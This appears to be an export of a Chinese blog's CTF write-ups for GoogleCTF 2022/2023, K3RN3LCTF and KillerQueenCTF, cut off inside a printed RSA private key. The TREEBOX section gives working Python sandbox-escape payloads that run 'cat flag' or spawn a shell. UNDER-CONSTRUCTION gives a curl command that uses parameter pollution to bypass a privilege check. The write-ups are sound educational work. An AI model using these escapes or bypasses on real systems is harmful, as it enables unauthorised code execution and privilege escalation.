000000f0  00 00 00 00 00 00 87 00  00 00 68 69 2e 74 78 74  |..........hi.txt|
00000100  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 43 be  |PK............C.|
00000110  b7 e8 01 00 00 00 01 00  00 00 06 00 00 00 66 6c  |..............fl|
00000120  61 67 30 30 61 50 4b 01  02 00 00 00 00 00 00 00  |ag00aPK.........|
00000130  00 00 00 00 00 43 be b7  e8 01 00 00 00 01 00 00  |.....C..........|
00000140  00 06 00 00 00 2b ef 00  00 00 00 00 00 00 00 00  |.....+..........|
00000150  01 00 00 66 6c 61 67 30  30 50 4b 03 04 00 00 00  |...flag00PK.....|
00000160  00 00 00 00 00 00 00 f9  ef be 71 01 00 00 00 01  |..........q.....|
00000170  00 00 00 06 00 00 00 66  6c 61 67 30 30 62 50 4b  |.......flag00bPK|
00000180  01 02 00 00 00 00 00 00  00 00 00 00 00 00 f9 ef  |................|
00000190  be 71 01 00 00 00 01 00  00 00 06 00 00 00 d2 ee  |.q..............|
000001a0  00 00 00 00 00 00 00 00  59 01 00 00 66 6c 61 67  |........Y...flag|
000001b0  30 30 50 4b 03 04 00 00  00 00 00 00 00 00 00 00  |00PK............|
000001c0  6f df b9 06 01 00 00 00  01 00 00 00 06 00 00 00  |o...............|
000001d0  66 6c 61 67 30 30 63 50  4b 01 02 00 00 00 00 00  |flag00cPK.......|
</code></pre>
<p>参照ZIP文件格式,按照<code>504B0304</code>、<code>504B0102</code>、<code>504B0506</code>分隔<code>dump.zip</code>的<a href="../../CTF/GoogleCTF2022/Misc/assets/hex.out">十六进制表示形式</a>,分析发现:</p>
<ul>
<li><code>hello.txt</code>和<code>hi.txt</code>一共占用256字节</li>
<li><code>flagXX</code>的文件实体为37字节、目录源数据为52字节</li>
<li>每组<code>flagXX</code>共占用(37 + 53) * 36字节</li>
</ul>
<p><img data-src="/../../CTF/GoogleCTF2022/Misc/images/B04B0506.png" alt="B04B0506"></p>
<p>发现结尾多了18个目录数据源结束标识,猜测可能以此还原文件,以<code>flag00</code>为例:</p>
<p>目录源数据的开始位置偏移为<code>0x880A0000</code>,用小端表示为<code>0x00000A88</code>(2696),减去<code>hello.txt</code>和<code>hi.txt</code>的256字节,减去第一个文件实体的37字节,然后除以(37+52)得到27,指向<code>flag00</code>这一组的第27个文件实体(从0开始),即字符C.基于flag的格式以C开头,大胆猜测这就是正确答案.</p>
<p>剩下的过程与之类似,可以使用脚本简化:</p>
<pre><code class="python">data = &quot;&quot;&quot;\
880A0000
65170000
42240000
BB2F0000
6C380000
274A0000
7F520000
3A640000
71690000
377C0000
587F0000
F1950000
3E9D0000
5EA80000
88BC0000
92C50000
2CD40000
20DB0000
3FEE0000
&quot;&quot;&quot;.split()
print(len(data))

CHOICES = &#39;abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_&#39;
ans = list()

def conv(s):
      # 大端转小端
    a = [s[2 * i:2 * (i + 1)] for i in range(len(s) // 2)]
    a.reverse()
    return &#39;&#39;.join(a)

for i,item in enumerate(data):
    t = int(conv(item), 16) - 256 - 37
    tt = t // (37 + 52)
    ttt = tt - 36 * i
    ans.append(CHOICES[ttt])
    print(&#39;&#39;.join(ans))
</code></pre>
<p>flag:<code>CTF&#123;p0s7m0d3rn_z1p&#125;</code></p>
<p>参考</p>
<ul>
<li><a href="https://xz.aliyun.com/t/3994">从做CTF题到手撕ZIP</a></li>
<li><a href="http://lordaeronesz.top/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">ZIP格式分析</a></li>
<li><a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">.ZIP File Format Specification</a></li>
</ul>
<h1 id="TREEBOX"><a href="#TREEBOX" class="headerlink" title="TREEBOX"></a>TREEBOX</h1><p><em>I think I finally got Python sandboxing right.</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301">Attachment</a> <code>treebox.2022.ctfcompetition.com 1337</code></em></p>
<hr>
<details>
<summary style="display: list-item;">treebox.py</summary>

<div markdown="1">

<pre><code class="python">#!/usr/bin/python3 -u
#
# Flag is in a file called &quot;flag&quot; in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update &amp;&amp; apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print(&quot;-- Please enter code (last line must contain only --END)&quot;)
source_code = &quot;&quot;
while True:
  line = sys.stdin.readline()
  if line.startswith(&quot;--END&quot;):
    break
  source_code += line

tree = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;, flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print(&quot;-- Executing safe code:&quot;)
  compiled = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;)
  exec(compiled)
</code></pre>
</div>
</details>

<p>阅读源码,可以发现:</p>
<ul>
<li><code>flag</code>在当前工作目录下一个名为<code>flag</code>的文件</li>
<li>我们可以通过<code>exec</code>执行任意代码,但必须通过<code>verify_secure</code>函数的检查</li>
<li><code>verify_secure</code>使用<code>ast</code>模块进行分析,不能有显式的函数调用和导入语句</li>
<li><code>os</code>和<code>sys</code>模块可用</li>
</ul>
<p>思路:</p>
<ul>
<li><code>os</code>模块已经导入,我们可以通过<code>os.system()</code>方法来执行系统命令</li>
<li>借助于Python机制,通过非显式的方式地来调用函数,如内置函数、重载运算符、解释器Hook</li>
</ul>
<p>我的解法:</p>
<p>在python中使用<code>in</code>运算符时,默认会调用<code>__contains__</code>方法,并且会将需要判断的对象作为形参传入;</p>
<p>所以我们可以用<code>os.system</code>覆盖现有的python对象&#x2F;类上的<code>__contains__</code>方法,然后通过运算符来调用<code>system</code>函数.</p>
<pre><code class="python">os.environ.__class__.__contains__ = os.system
&#39;cat flag&#39; in os.environ
</code></pre>
<p>其他解法:</p>
<ol>
<li><p>装饰器</p>
<pre><code class="python">@exec
@input
class X:
  pass
</code></pre>
</li>
<li><p>异常</p>
<pre><code class="python">class MyException(Exception):
  def __str__(self):
    return &#39;cat flag&#39;

sys.stdout.write=os.system
sys.stderr.write=os.system

raise MyException   
</code></pre>
<pre><code class="python">class X:
    def __init__(self, a, b, c):
        self += &quot;os.system(&#39;sh&#39;)&quot;
    __iadd__ = exec
sys.excepthook = X
1/0
</code></pre>
</li>
<li><p>元类</p>
<pre><code class="python"># This will define the members on the &quot;sub&quot;class
class Metaclass:
    __getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type
    
class Sub(metaclass=Metaclass): # That&#39;s how we make Sub.__class__ == Metaclass
    pass # Nothing special to do

assert isinstance(Sub, Metaclass)
sub[&#39;import os; os.system(&quot;sh&quot;)&#39;]
</code></pre>
</li>
</ol>
<p>其他Writeup</p>
<ul>
<li><a href="https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/">GCTF 2022 Treebox</a></li>
</ul>
<p><strong>flag:</strong><code>CTF&#123;CzeresniaTopolaForsycja&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
        <category>GoogleCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>GoogleCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>GoogleCTF2023 Writeup</title>
    <url>/posts/851556193/</url>
    <content><![CDATA[<h1 id="LEAST-COMMON-GENOMINATOR"><a href="#LEAST-COMMON-GENOMINATOR" class="headerlink" title="LEAST COMMON GENOMINATOR?"></a>LEAST COMMON GENOMINATOR?</h1><p><em>Someone used this program to send me an encrypted message but I can&#39;t read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but what do I do with it?!</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/4e90c59c2c12ac422f0b83094cca2c3e5c4c7cce464dddc5cb2ad391155f11c96a183290a289dfe1c64cc9e3cd467706f07e621904588ca4def3a4f6906234b7.zip">Attachment</a></em></p>
<hr>
<details>
<summary style="display: list-item;">generate.py</summary>
<div markdown="1">

<pre><code class="python">from secret import config
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, isPrime

class LCG:
    lcg_m = config.m
    lcg_c = config.c
    lcg_n = config.n

    def __init__(self, lcg_s):
        self.state = lcg_s

    def next(self):
        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
        return self.state

if __name__ == &#39;__main__&#39;:

    assert 4096 % config.it == 0
    assert config.it == 8
    assert 4096 % config.bits == 0
    assert config.bits == 512

    # Find prime value of specified bits a specified amount of times
    seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
    lcg = LCG(seed)
    primes_arr = []

    dump = True
    items = 0
    dump_file = open(&quot;dump.txt&quot;, &quot;w&quot;)

    primes_n = 1
    while True:
        for i in range(config.it):
            while True:
                prime_candidate = lcg.next()
                if dump:
                    dump_file.write(str(prime_candidate) + &#39;\n&#39;)
                    items += 1
                    if items == 6:
                        dump = False
                        dump_file.close()
                if not isPrime(prime_candidate):
                    continue
                elif prime_candidate.bit_length() != config.bits:
                    continue
                else:
                    primes_n *= prime_candidate
                    primes_arr.append(prime_candidate)
                    break

        # Check bit length
        if primes_n.bit_length() &gt; 4096:
            print(&quot;bit length&quot;, primes_n.bit_length())
            primes_arr.clear()
            primes_n = 1
            continue
        else:
            break

    # Create public key &#39;n&#39;
    n = 1
    for j in primes_arr:
        n *= j
    print(&quot;[+] Public Key: &quot;, n)
    print(&quot;[+] size: &quot;, n.bit_length(), &quot;bits&quot;)

    # Calculate totient &#39;Phi(n)&#39;
    phi = 1
    for k in primes_arr:
        phi *= (k - 1)

    # Calculate private key &#39;d&#39;
    d = pow(config.e, -1, phi)

    # Generate Flag
    assert config.flag.startswith(b&quot;CTF&#123;&quot;)
    assert config.flag.endswith(b&quot;&#125;&quot;)
    enc_flag = bytes_to_long(config.flag)
    assert enc_flag &lt; n

    # Encrypt Flag
    _enc = pow(enc_flag, config.e, n)

    with open (&quot;flag.txt&quot;, &quot;wb&quot;) as flag_file:
        flag_file.write(_enc.to_bytes(n.bit_length(), &quot;little&quot;))

    # Export RSA Key
    rsa = RSA.construct((n, config.e))
    with open (&quot;public.pem&quot;, &quot;w&quot;) as pub_file:
        pub_file.write(rsa.exportKey().decode())
</code></pre>
</div>
</details>

<p>分析可知:</p>
<ul>
<li><p>flag是使用RSA加密的,已知公🔑 文件,即n,e</p>
</li>
<li><p>使用LCG线性同余生成器生成素数</p>
</li>
<li><p>已知LCG的种子和前6个连续生成的数字</p>
</li>
<li><p>config.it &#x3D; 8</p>
</li>
<li><p>config.bits &#x3D; 256</p>
</li>
</ul>
<p>LCG是伪随机数生成器和流密码的一种,递推公式是 𝑋𝑛+1&#x3D;(𝑎𝑋𝑛+𝑐) 𝑚𝑜𝑑 𝑚</p>
<p>已知初值和随后LCG连续生成的6个值,未知增量、乘数和模数.</p>
<p>我们可以通过攻击得到这三个值,然后模拟原算法通过LCG得到8个素数后,进一步计算n的欧拉函数并求逆元得到d,解密即可.</p>
<details>
<summary style="display: list-item;">题解:</summary>
<div markdown="1">

<pre><code class="python">import math
from functools import reduce

import gmpy2

from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, isPrime, long_to_bytes

dump_file = open(&quot;dump.txt&quot;)
output_values = [int(x) for x in dump_file.readlines()]  # 已知的 LCG 输出值

def crack_unknown_increment(states, modulus, multiplier):
    &quot;&quot;&quot;
    已知：a,m,s0,s1
    求c
    &quot;&quot;&quot;
    increment = (states[1] - states[0] * multiplier) % modulus
    return modulus, multiplier, increment

def crack_unknown_multiplier(states, modulus):
    &quot;&quot;&quot;
    已知：m,s0,s1,s2
    求a
    &quot;&quot;&quot;
    multiplier = (
        (states[2] - states[1]) * gmpy2.invert(states[1] - states[0], modulus) % modulus
    )  # 注意这里求逆元
    return crack_unknown_increment(states, modulus, multiplier)

def crack_unknown_modulus(states):
    &quot;&quot;&quot;
    已知：s0-s6
    求a,c,m
    &quot;&quot;&quot;
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
    zeroes = [t2 * t0 - t1 * t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
    modulus = abs(reduce(math.gcd, zeroes))
    return crack_unknown_multiplier(states, modulus)

class LCG:
    def __init__(self, lcg_m, lcg_c, lcg_n, lcg_s):
        self.state = lcg_s
        self.lcg_m = lcg_m
        self.lcg_c = lcg_c
        self.lcg_n = lcg_n

    def next(self):
        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
        return self.state


m, a, c = crack_unknown_modulus(output_values)
seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
lcg = LCG(a, c, m, seed)
print(a, c, m)
primes_n = 1
primes_arr = []
for i in range(8):
    while True:
        prime_candidate = lcg.next()
        if not isPrime(prime_candidate):
            continue
        elif prime_candidate.bit_length() != 512:
            continue
        else:
            primes_n *= prime_candidate
            primes_arr.append(prime_candidate)
            break

print(list(primes_arr))

phi = 1
for k in primes_arr:
    phi *= k - 1

key = RSA.importKey(open(&quot;public.pem&quot;, &quot;r&quot;).read())
n = key.n
e = key.e
d = gmpy2.invert(e, phi)

enc = open(&quot;flag.txt&quot;, &quot;rb&quot;).read()

flag = pow(int.from_bytes(enc, &quot;little&quot;), d, n)
print(long_to_bytes(flag))
</code></pre>
</div>
</details>

<p><strong>flag</strong>: <code>CTF&#123;C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy&#125;</code></p>
<p>参考:</p>
<ul>
<li><a href="https://www.codercto.com/a/35743.html">攻击线性同余生成器(LCG) | 码农网</a></li>
<li><a href="https://blog.csdn.net/weixin_45883223/article/details/115299389">LCG(线性同余生成器)_lcg线性同余_WustHandy的博客-CSDN博客</a></li>
</ul>
<h1 id="NPC"><a href="#NPC" class="headerlink" title="NPC"></a>NPC</h1><p><em>A friend handed me this map and told me that it will lead me to the flag.<br>It is confusing me and I don&#39;t know how to read it, can you help me out?</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/9a8f5d47fab0a460f9826c4f13aa1dff2809140e68325fb21edab674ee5ec2476b902d2797c41bd6d9311e3510c9366d739d9404e00aa9d4ffd6a0d88e5bf2ef.zip">Attachment</a></em></p>
<hr>
<p>使用Graphviz工具将<code>hint.dot</code>转换为图片,得到下图</p>
<pre><code class="shell">dot -Tjpg  hint.dot -o hint.jpg
</code></pre>
<img data-src="../../CTF/GoogleCTF2023/Misc/assets/hint.jpg" alt="hint.jpg" width="300">

<p>分析代码:</p>
<ul>
<li><p>从<code>USACONST.TXT</code>中随机选择N个单词生成密码,使用<code>passphrase.encrypt(secret, password)</code>对flag加密</p>
</li>
<li><p>对于<code>password</code>中的每个字母,创建一个带有唯一ID的节点,并添加到图中</p>
</li>
<li><p>按照<code>password</code>的顺序,对密码中相邻的两个字符创建一条边</p>
</li>
<li><p>向图中随机添加<code>int(len(password) ** 1.3)</code>条边</p>
</li>
<li><p>随机打乱图中节点和边的顺序</p>
</li>
<li><p>随机交换一些节点的起点和终点,由于<code>random() % 2</code>只有在<code>random</code>函数返回值为0时才为<code>False</code>,我们假定图中每条边的起点和终点都被交换了一遍</p>
</li>
<li><p>将节点和边的信息写入到<code>hint.dot</code>文件中</p>
</li>
</ul>
<p>我是思路是:</p>
<ol>
<li><p>遍历words_list中的单词,从每个节点出发,使用DFS判断是否可以在图中找到,这样过滤后得到30个单词,即密码一定由该30个单词中的某几个单词组成</p>
</li>
<li><p>枚举密码中所用的单词个数N</p>
</li>
<li><p>使用组合数从这30个单词选择N个单词</p>
</li>
<li><p>判断所选的N个单词组成的字符集和<code>hint.dot</code>中的字符集是否一致</p>
</li>
<li><p>对N个单词进行全排列,并尝试解密 (<em>为了提高效率,这里还用到了多进程</em>)</p>
</li>
</ol>
<p>当N&#x3D;5时,得到password<code>standardwatersigngivenchosen</code>和<code>flag</code>.</p>
<details>
<summary style="display: list-item;">代码</summary>
<div markdown="1">

<pre><code class="python">import concurrent.futures
import itertools
import re
from collections import Counter

from pyrage import passphrase

from encrypt import get_word_list


class Node:
    def __init__(self, letter):
        self.letter = letter
        self.adjacent = []

    def __str__(self) -&gt; str:
        return f&quot;&#123;self.letter&#125; -&gt; &#123;[x.letter for x in self.adjacent]&#125;&quot;

    __repr__ = __str__

def build_nodes():
    pattern = r&quot;\s+(\d+)\s+\[label=(\w+)\];&quot;
    pattern2 = r&quot;\s+(\d+)\s+--\s+(\d+);$&quot;
    nodes = dict()
    with open(&quot;hint.dot&quot;, &quot;r&quot;) as f:
        for line in f:
            if &quot;label&quot; in line
                match = re.match(pattern, line)
                node_id = match.group(1)
                letter = match.group(2)
                nodes[node_id] = Node(letter)
            elif &quot;--&quot; in line:
                match = re.match(pattern2, line)
                start = match.group(1)
                end = match.group(2)
                # nodes[start].adjacent.append(nodes[end])
                nodes[end].adjacent.append(nodes[start])
    return nodes

visited = set()

def dfs(node, index, word):
    if index == len(word):
        return True

    if node.letter != word[index]:
        return False

    visited.add(node)

    for adj in node.adjacent:
        if adj not in visited:
            if dfs(adj, index + 1, word):
                return True

    visited.remove(node)
    return False

def check(password):
    with open(&quot;secret.age&quot;, &quot;rb&quot;) as f:
        enc = f.read()
    try:
        print(&quot;[FLAG] is &quot;, passphrase.decrypt(enc, password))
        print(&quot;Password is &quot;, password)
    except Exception as e:
        pass


def filter_words(nodes):
    ans = set()
    for word in get_word_list():
        visited.clear()
        for node in nodes.values():
            if dfs(node, 0, word):
                ans.add(word)
                break

    print(&quot;ans:&quot;, len(ans), ans)
    return ans


def main():
    nodes = build_nodes()

    letters = sorted([node.letter for node in nodes.values()])

    ans = filter_words(nodes)
    for num in range(1, len(ans) + 1):
        print(f&quot;Num is &#123;num&#125;&quot;)
        for comb in itertools.combinations(ans, num):  # 组合
            if sorted(&quot;&quot;.join(comb)) == letters:
                passwords = [
                    &quot;&quot;.join(perm) for perm in itertools.permutations(comb, len(comb))
                ]

                with concurrent.futures.ProcessPoolExecutor(max_workers=8) as executor:
                    executor.map(check, passwords)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
</div>
</details>

<p><strong>flag</strong>: <code>CTF&#123;S3vEn_bR1dg35_0f_K0eN1g5BeRg&#125;</code></p>
<p>参考:</p>
<ul>
<li><a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#processpoolexecutor">concurrent.futures --- 启动并行任务 -- Python 3.11.4 文档</a></li>
</ul>
<h1 id="UNDER-CONSTRUCTION"><a href="#UNDER-CONSTRUCTION" class="headerlink" title="UNDER-CONSTRUCTION"></a>UNDER-CONSTRUCTION</h1><p><em>We were building a web app but the new CEO wants it remade in php.</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/22790c2f38bd6adde75753641011c223db7e2c0ec718df6e883976ed9c518ca0a86ef67b7e153fd07a9fa734f6a5350028ca266e3bf646f1096d2c4d536ff45a.zip">Attachment</a></em><br><em><code>https://under-construction-web.2023.ctfcompetition.com</code></em><br><em><code>https://under-construction-php-web.2023.ctfcompetition.com</code></em></p>
<hr>
<p>题目提供了Flask和PHP两个站点,用户可以在Flask站点进行注册,注册的账号可以同时用于登录Flask和PHP两个站点.</p>
<p>分析代码:</p>
<p>Flask会将HTTP请求原始查询参数转发到PHP应用程序中完成用户注册.</p>
<pre><code class="python"># File: /flask/authorized_routes.py
@authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;])
def signup_post():
    raw_request = request.get_data()
    ...
    requests.post(f&quot;http://&#123;PHP_HOST&#125;:1337/account_migrator.php&quot;, 
        headers=&#123;&quot;token&quot;: TOKEN, &quot;content-type&quot;: request.headers.get(&quot;content-type&quot;)&#125;, data=raw_request)
    return redirect(url_for(&#39;authorized.login&#39;))
</code></pre>
<p>只有<code>gold</code>级别的用户,在PHP站点登录后才可以看到FLAG</p>
<pre><code class="php"># File: /php/index.php
function getResponse()
&#123;
    ...
    $response = &quot;Login successful. Welcome &quot; . htmlspecialchars($username) . &quot;.&quot;;

    if ($tier === &quot;gold&quot;) &#123;
        $response .= &quot; &quot; . getenv(&quot;FLAG&quot;);
    &#125;

    return $response;
&#125;
</code></pre>
<p>Flask会对查询参数进行校验,防止创建高权限的用户.</p>
<pre><code class="python"># File: /flask/authorized_routes.py
@authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;])
def signup_post():
    ...
    tier = models.Tier(request.form.get(&#39;tier&#39;))
    if(tier == models.Tier.GOLD):
        flash(&#39;GOLD tier only allowed for the CEO&#39;)
        return redirect(url_for(&#39;authorized.signup&#39;))
    ...
</code></pre>
<p>HTTP查询参数中存在重复的key时,在Flask和PHP有不同的行为,flask会取第一个值,而PHP会取最后一个值.</p>
<p>因此我们可以构造如下命令,以此绕过Flask对查询参数的校验,并在PHP中注册高权限用户.</p>
<p><strong>curl</strong></p>
<pre><code class="shell">curl -X POST https://under-construction-web.2023.ctfcompetition.com/signup -d &quot;username=admin&amp;password=admin&amp;tier=blue&amp;tier=gold&quot;
</code></pre>
<p>然后用上述的用户名和密码去PHP站点登录即可.</p>
<p><strong>flag</strong>: <code>CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
        <category>GoogleCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>GoogleCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>K3RN3LCTF2021 Writeup</title>
    <url>/posts/3427623925/</url>
    <content><![CDATA[<h1 id="3in1"><a href="#3in1" class="headerlink" title="3in1"></a>3in1</h1><p><em>Description</em><br><em>Like Nescafeeeee!</em></p>
<p><em>Attachments</em></p>
<p><em><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py</a></em></p>
<hr>
<p>分析代码,发现是AES加密,密钥为<code>hkey</code></p>
<pre><code class="python">password = (&quot;abda&quot;)    
hash_obj = SHA256.new(password.encode(&#39;utf-8&#39;))    
hkey = hash_obj.digest()

def decrypt(info):
    cipher = AES.new(hkey, AES.MODE_ECB)
    result = cipher.decrypt(info)
    return result
msg =  b&#39;\x1bkw\x00\x01#\x1dv\xd1\x1e\xfb\xba\xac_b\x02T\xfbZ\xca\xac8Y\\8@4\xba;\xe1\x11$\x19\xe8\x89t\t\xc8\xfd\x93\xd8-\xba\xaa\xbe\xf1\xa0\xab\x18\xa0\x12$\x9f\xdb\x08~\x81O\xf0y\xe9\xef\xc41\x1a$\x1cN3\xe8F\\\xef\xc1G\xeb\xdb\xa1\x93*F\x1b|\x1c\xec\xa3\x04\xbf\x8a\xd9\x16\xbc;\xd2\xaav6pWX\xc1\xc0o\xab\xd5V^\x1d\x11\xe4&#125;6\xa4\x1b\\G\xd4e\xc2mP\xdb\x9b\x9f\xb0Z\xf12&#39;

print(decrypt(msg))
</code></pre>
<p>AES解密得到两个url,访问url得到文件<code>hint.txt</code>和<code>flag.wav</code></p>
<pre><code class="python">b&#39;https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file&#39;
</code></pre>
<p>查看<code>hint.txt</code>,提示我们“图形或照片表示”</p>
<pre><code>A graphic or photographic representation 
</code></pre>
<p>使用<a href="https://www.sonicvisualiser.org/download.html">Sonic Visualiser</a>打开<code>flag.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>,得到flag</p>
<p><img data-src="/../../CTF/K3RN3LCTF2021/Crypto/images/image-20211119215941779.png" alt="image-20211119215941779"></p>
<p><strong>flag:</strong><code>flag&#123;34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps&#125;</code></p>
<h1 id="Progressive-Dynamite"><a href="#Progressive-Dynamite" class="headerlink" title="Progressive Dynamite"></a>Progressive Dynamite</h1><p>Find the minimal sum of numbers on a path from the top left corner to the bottom right corner. You can only go right or down in each move.</p>
<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt</a></p>
<hr>
<p>题目给了一个包含负整数的网格,要求我们找到一条从网格左上角元素到右下角元素的路径,使得路径上的数字总和最小.</p>
<p>参照<a href="https://leetcode-cn.com/problems/minimum-path-sum/solution/zui-xiao-lu-jing-he-by-leetcode-solution/">Leetcode-最小路径和</a>,是一道典型的动态规划题,代码如下:</p>
<pre><code class="python">from Crypto.Util.number import *
from challenge import grid

rows, columns = len(grid), len(grid[0])
dp = [[0] * columns for _ in range(rows)]
dp[0][0] = grid[0][0]
for i in range(1, rows):
    dp[i][0] = dp[i - 1][0] + grid[i][0]
for j in range(1, columns):
    dp[0][j] = dp[0][j - 1] + grid[0][j]
for i in range(1, rows):
    for j in range(1, columns):
        dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j]
print(dp[rows - 1][columns - 1])
print(long_to_bytes(dp[-1][-1]))
</code></pre>
<p><strong>flag:</strong><code>flag&#123;dyn4m1c_pr0gramm1ng_pr0!&#125;</code></p>
<h1 id="Vieta-s-Poly"><a href="#Vieta-s-Poly" class="headerlink" title="Vieta&#39;s Poly"></a>Vieta&#39;s Poly</h1><p>Here&#39;s a pwntools tutorial challenge to get you warmed up!</p>
<p>nc ctf.k3rn3l4rmy.com 2236</p>
<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py</a></p>
<hr>
<p>题目给了一个多项式,要求我们计算:</p>
<ul>
<li>根的和</li>
<li>根的倒数的和</li>
<li>根的平方的和</li>
</ul>
<p>解析出多项式系数,借助<code>numpy.poly1d</code>构造多项式,即可计算出根,进一步计算得到所需结果(需要保留两位小数)</p>
<p>代码:</p>
<pre><code class="python">from math import ceil
from pwn import *
import numpy as np

context.log_level = &#39;debug&#39;
conn = remote(&#39;ctf.k3rn3l4rmy.com&#39;, 2236)

def get_input():
    input = conn.recvline().strip().decode()
    return input

def parse(polynomial):
    &#39;&#39;&#39;
    TODO: Parse polynomial
    For example, parse(&quot;x^3 + 2x^2 - x + 1&quot;) should return [1,2,-1,1]
    &#39;&#39;&#39;
    pattern = re.compile(r&quot;([-]?\d+?)x\^\d+&quot;)
    ls = pattern.findall(polynomial.replace(&quot; &quot;,&#39;&#39;))
    ls.insert(0, 1)
    return list(map(int, ls))

for _ in range(4):
    get_input()
for i in range(100):
    type = get_input()
    coeffs = parse(get_input())
    ans = -1
    Q = np.poly1d(coeffs, r=False)
    xs = np.roots(Q)
    if &#39;sum of the roots&#39; in type:
        ans = xs.sum()
    elif &#39;sum of the reciprocals of the roots&#39; in type:
        ans = (1/xs).sum()
    elif &#39;sum of the squares of the roots&#39; in type:
        ans = np.power(xs,2).sum()
    ans = ceil(round(ans.real,2))
    conn.sendline(str(ans))
    get_input()
conn.interactive()
</code></pre>
<p><strong>flag:</strong><code>flag&#123;Viet4s_f0r_th3_win&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>K3RN3LCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>KillerQueenCTF2021 Writeup</title>
    <url>/posts/2621990551/</url>
    <content><![CDATA[<h1 id="Cloudsourcing"><a href="#Cloudsourcing" class="headerlink" title="Cloudsourcing"></a>Cloudsourcing</h1><p><em>Sourced in the cloud</em></p>
<hr>
<p>使用<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>破解公钥,将得到的私钥保存至<code>a.pem</code></p>
<pre><code class="shell">~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1
e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4
O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn
dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m
lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs
pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z
KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs
dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o
19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2
